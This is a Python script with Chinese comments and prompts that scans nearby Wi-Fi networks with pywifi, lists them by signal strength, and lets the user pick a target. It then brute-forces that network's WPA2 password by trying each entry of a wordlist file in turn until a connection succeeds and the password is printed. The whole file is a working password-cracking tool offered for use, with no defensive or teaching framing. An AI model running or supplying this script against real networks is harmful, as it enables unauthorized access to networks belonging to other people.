from pywifi import PyWiFi, const, Profile
import time

def scan_wifi():
    wifi = PyWiFi()
    ifaces = wifi.interfaces()  # 获取所有网络接口

    if not ifaces:
        print("未找到无线网卡接口，请确保无线网卡已启用。")
        return

    iface = ifaces[0]  # 使用第一个无线网卡接口
    
    print(f"当前设备使用的无线网卡为: {iface.name()}")

    status = iface.status()
    # 进行断开当前连接的操作（如果当前是连接着的<status=4>）
    if status == const.IFACE_CONNECTED:
        print("发现已连接的Wi-Fi网络，为了扫描的精准度，正在进行断开，请等待2秒...")
        iface.disconnect()
        time.sleep(2)  # 等待2s，断开当前连接 再进行扫描 更精准
    
    print("开始扫描附近的Wi-Fi网络，请等待8秒...")
    iface.scan()  # 启动扫描
    time.sleep(8)  # 增加等待时间，确保扫描完成
    results = iface.scan_results()

    if not results:
        print("未扫描到任何Wi-Fi网络。")
        return

    print("扫描Wi-Fi网络完成！")

    print("--- Wi-Fi按扫描得到的顺序进行排列 ---")  # 默认是根据扫描得到的顺序排列的

    for network in results:
        print(f"SSID: {network.ssid}, 信号强度: {network.signal}")

    print("--- Wi-Fi按信号强度的顺序进行排列（由强到弱 1 ~ N） ---")  # 默认是根据扫描得到的顺序排列的

    # 按信号强度排序（由强到弱）
    sorted_results = sorted(results, key=lambda x: x.signal, reverse=True)
    index = 1
    for network in sorted_results:
        print(f"{index}: SSID: {network.ssid}, 信号强度: {network.signal}")
        index+=1
    return iface, sorted_results

def connect_to_wifi(ssid, pwd, network_card):
    profile = Profile()
    profile.ssid = ssid # Wi-Fi 网络的名称（SSID）
    profile.key = pwd # Wi-Fi 密码（如果需要）
    profile.auth = const.AUTH_ALG_OPEN # 认证类型 const.AUTH_ALG_SHARED
    # profile.akm.append(const.AKM_TYPE_WPA2PSK)  # 添加 WPA2 个人版
    # profile.akm.append(const.AKM_TYPE_WPAPSK)   # 添加 WPA 个人版
    profile.akm = const.AKM_TYPE_WPA2PSK  # 使用 WPA2 个人版
    profile.cipher = const.CIPHER_TYPE_CCMP # 加密单元

    network_card.remove_all_network_profiles()
    tmp_profile = network_card.add_network_profile(profile)
    network_card.connect(tmp_profile)
    time.sleep(5) # 5s进行连接
    if network_card.status() == const.IFACE_CONNECTED:
        is_connected = True
    else:
        is_connected = False
        network_card.disconnect() # 密码不正确断开连接
        time.sleep(2) # 断开2s
    return is_connected

def crack_wifi(ssid, network_card):
    """
    暴力破解 WiFi 密码
    :param ssid: WiFi 的名称（SSID）
    :param network_card: 使用的网络接口（如 wlan0）
    :return: 成功返回密码，失败返回 None
    """
    file_path = "passwords.txt"

    try:
        with open(file_path, "r") as passwords_file:
            for pwd in passwords_file:
                pwd = pwd.strip()  # 去除空白字符
                if not pwd:  # 跳过空行
                    continue
                
                print(f"正在尝试密码: {pwd}")
                if connect_to_wifi(ssid, pwd, network_card):
                    print(f"密码 {pwd} 成功连接！")
                    return pwd  # 成功连接，返回密码
                else:
                    print(f"密码 {pwd} 连接失败！")
                    time.sleep(3)  # 停顿 3 秒再尝试下一个密码
                    
    except FileNotFoundError:
        print(f"错误：文件 {file_path} 不存在！")
    except PermissionError:
        print(f"错误：请确保有 {file_path} 文件的读取权限！")
    except Exception as e:
        print(f"发生未知错误: {e}")
    
    return None  # 失败返回 None

try:
    network_card, scan_results = scan_wifi()
    if not network_card:
        print("未获取到设备的网卡信息")

    if not scan_results:
        print("未获取到附近的Wi-Fi网络信息")

    try:
        target_wifi_index = int(input("请输入需要破解的wifi序号(信号强度值越大，信号越好)：")) - 1
        if target_wifi_index < 0 or target_wifi_index >= len(scan_results):
            print(f"输入的序号无效，请重新运行程序并输入正确的序号，正确的输入序号应当在 1 ~ {len(scan_results)}之间")
        else:
            target_wifi_ssid = scan_results[target_wifi_index].ssid
            print("开始破解Wi-Fi(SSID)：", target_wifi_ssid)
            result = crack_wifi(target_wifi_ssid, network_card)
            if result is None:
                print("破解失败！密码本中未找到正确的密码，请更换新的密码本后重试。")
            else:
                print(f"破解成功！Wi-Fi(SSID) <{target_wifi_ssid}> 的密码是：", result)
    except ValueError:
        print("输入的不是有效数字，请重新运行程序并输入正确的序号。")
except KeyboardInterrupt:
    print("\n程序被用户中断，已退出...")
